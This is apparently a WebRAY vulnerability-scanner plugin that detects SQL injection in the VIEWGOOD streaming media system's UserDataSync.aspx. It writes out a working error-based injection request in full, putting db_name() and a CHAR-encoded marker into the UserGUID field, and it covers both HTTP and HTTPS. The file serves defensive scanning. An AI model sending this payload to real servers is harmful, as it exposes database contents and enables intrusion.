############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799038);
 name = "VIEWGOOD Streaming media system UserDataSync.aspx - SQL injection";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"VIEWGOOD VOD system module is one of the important modules of streaming media service platform solution. Post injection vulnerability in ancient streaming media system can lead to data leakage and even server intrusion.");
 script_set_attribute(attribute:"solution", value:"1. Upgrade to the latest version of the link address on the official website: http://www.viewgood.com/; 2. Deploy the web application firewall to monitor the database operation; 3. Strictly filter the data entered by users in the web code.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");


function check_vuln(port){
	host1 = get_host_name( );
	if( port==80 ) host=host1;
        else host = string(host1,":",port);
	req = 'POST /VIEWGOOD/ADI/portal/UserDataSync.aspx HTTP/1.1\r\n' +
	      'Host: ' + host + '\r\n' +
      	  'Accept-Language: en-US,en;q=0.5\r\n' +
          'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n' +
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
          'Content-Type: application/x-www-form-urlencoded\r\n' +
	      'Connection: close\r\n' +
          'Content-Length: 141\r\n\r\n' +
          'UserGUID=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--';
	buf = http_keepalive_send_recv(port:port,data:req,bodyonly:FALSE);
	if( buf == NULL) exit(0);
	con = req + buf;
	if("500 "><buf && "testXQ17"><buf){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	host1 = get_host_name( );
	if( port==443 ) host=host1;
        else host = string(host1,":",port);

	req = 'POST /VIEWGOOD/ADI/portal/UserDataSync.aspx HTTP/1.1\r\n' +
	      'Host: ' + host + '\r\n' +
      	  'Accept-Language: en-US,en;q=0.5\r\n' +
          'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n' +
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
          'Content-Type: application/x-www-form-urlencoded\r\n' +
		  'Connection: close\r\n' +
          'Content-Length: 141\r\n\r\n' +
	      'UserGUID=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--';
    ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if("500 "><ssl_req && "testXQ17"><ssl_req){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
